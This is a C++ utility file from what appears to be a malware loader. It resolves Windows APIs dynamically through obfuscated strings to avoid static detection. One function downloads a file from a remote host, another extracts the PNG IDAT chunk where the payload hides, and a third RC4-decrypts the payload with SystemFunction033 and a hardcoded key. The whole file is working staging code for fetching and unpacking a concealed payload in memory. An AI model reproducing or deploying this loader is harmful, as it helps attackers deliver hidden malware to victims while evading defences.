
#include "utils.h"




ULONG sl(const char* str) {
	ULONG len = 0;
	while (*str++)
		len++;
	return len;
}


std::vector<char> FetchFileContents(const wchar_t* host, const wchar_t* useragent) {
	

	PIC_WSTRING(KERNEL32, L"KERNEL32.DLL");
	PIC_STRING(LOADLIBRARY, "LoadLibraryW");

	HMODULE hKernel32 = hlpGetModuleHandle(KERNEL32);
	typedef HMODULE(WINAPI* LoadLibraryW)(LPCWSTR lpLibFileName);
	LoadLibraryW pLoadLibraryW = (LoadLibraryW)hlpGetProcAddress(hKernel32, (PCHAR)LOADLIBRARY);

	PIC_WSTRING(WININET, L"wininet.dll");

	HMODULE wininet_module = pLoadLibraryW(WININET);
	
	
	typedef HINTERNET(WINAPI* InternetOpenW)(LPCWSTR lpszAgent, DWORD   dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD   dwFlags);
	PIC_STRING(InternetOpen_function, "InternetOpenW");
	InternetOpenW pInternetOpenW = (InternetOpenW)hlpGetProcAddress(wininet_module, (PCHAR)InternetOpen_function);

	typedef HINTERNET(WINAPI* InternetOpenUrlW)(HINTERNET hInternet, LPCWSTR   lpszUrl, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
	PIC_STRING(InternetOpenUrlW_function, "InternetOpenUrlW");
	InternetOpenUrlW pInternetOpenUrlW = (InternetOpenUrlW)hlpGetProcAddress(wininet_module, (PCHAR)InternetOpenUrlW_function);

	typedef BOOL(WINAPI* InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
	PIC_STRING(InternetReadFile_function, "InternetReadFile");
	InternetReadFile pInternetReadFile = (InternetReadFile)hlpGetProcAddress(wininet_module, (PCHAR)InternetReadFile_function);

	typedef BOOL(WINAPI* InternetCloseHandle)(HINTERNET hInternet);
	PIC_STRING(InternetCloseHandle_function, "InternetCloseHandle");
	InternetCloseHandle pInternetCloseHandle = (InternetCloseHandle)hlpGetProcAddress(wininet_module, (PCHAR)InternetCloseHandle_function);

	HINTERNET hInternet, hFile;
	DWORD bytesRead;
	std::vector<char> buffer;
	char tempBuffer[4096]; // Temporary buffer

	// Initialize WinINet
	hInternet = pInternetOpenW(useragent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hInternet) {
		return {}; //return empty buffer
	}

	// Open the URL
	hFile = pInternetOpenUrlW(hInternet, host, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hFile) {
		pInternetCloseHandle(hInternet);
		return {}; //return empty buffer
	}

	// Read the file into memory
	do {
		if (!pInternetReadFile(hFile, tempBuffer, sizeof(tempBuffer), &bytesRead)) {
			break;
		}
		if (bytesRead == 0) break; // No more data to read
		buffer.insert(buffer.end(), tempBuffer, tempBuffer + bytesRead);
	} while (true);

	// Close handles
	pInternetCloseHandle(hFile);
	pInternetCloseHandle(hInternet);

	return buffer;
}



std::vector<char> ReadPngIdat(std::vector<char> png_data) {
	std::vector<char> idat_data;

	if (png_data.empty()) {
		//std::cerr << "empty png" << std::endl;
		return idat_data;
	}

	const size_t png_sig_size = 8;
	const uint8_t png_sig[png_sig_size] = { 137, 80, 78, 71, 13, 10, 26, 10 };

	if (png_data.size() < png_sig_size || std::memcmp(png_data.data(), png_sig, png_sig_size) != 0) {
		//std::cerr << "File is not a PNG image" << std::endl;
		return idat_data;
	}

	size_t offset = png_sig_size;

	while (offset + 8 < png_data.size()) {
		uint32_t chunk_size = (static_cast<uint8_t>(png_data[offset]) << 24) |
			(static_cast<uint8_t>(png_data[offset + 1]) << 16) |
			(static_cast<uint8_t>(png_data[offset + 2]) << 8) |
			(static_cast<uint8_t>(png_data[offset + 3]));

		char chunk_type[5] = { png_data[offset + 4], png_data[offset + 5], png_data[offset + 6], png_data[offset + 7], 0 };

		if (std::strcmp(chunk_type, "IDAT") == 0) {
			idat_data.resize(chunk_size);
			std::memcpy(idat_data.data(), &png_data[offset + 8], chunk_size);
		}
		else if (std::strcmp(chunk_type, "IEND") == 0) {
			//std::cerr << "reached the end of PNG" << std::endl;
			break;
		}

		offset += 8 + chunk_size + 4;  // Move to the next chunk (8 bytes header + chunk size + 4 bytes CRC)
	}

	if (idat_data.empty()) {
		//std::cerr << "IDAT chunk not found" << std::endl;
	}

	return idat_data;
}


std::vector<char> DecryptStream(std::vector<char> file_stream) {

	struct ustring {
		DWORD Length;
		DWORD MaximumLength;
		PUCHAR Buffer;
	} _data, key;

	typedef NTSTATUS(WINAPI* _SystemFunction033)(struct ustring *memoryRegion, struct ustring *keyPointer);
	PIC_STRING(SystemFunction033_function, "SystemFunction033");
	PIC_WSTRING(ADVAPI32, L"advapi32.dll");

	_SystemFunction033 SystemFunction033 = (_SystemFunction033)hlpGetProcAddress(hlpGetModuleHandle(ADVAPI32), (PCHAR)SystemFunction033_function);

	PIC_STRING(_key, "www.osandamalith.com");

	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof(_key)-1;

	_data.Buffer = (PUCHAR)file_stream.data();
	_data.Length = file_stream.size();

	SystemFunction033(&_data, &key);

	vector<char> file_decrypted(_data.Buffer, _data.Buffer + _data.Length);
		
	return file_decrypted;
}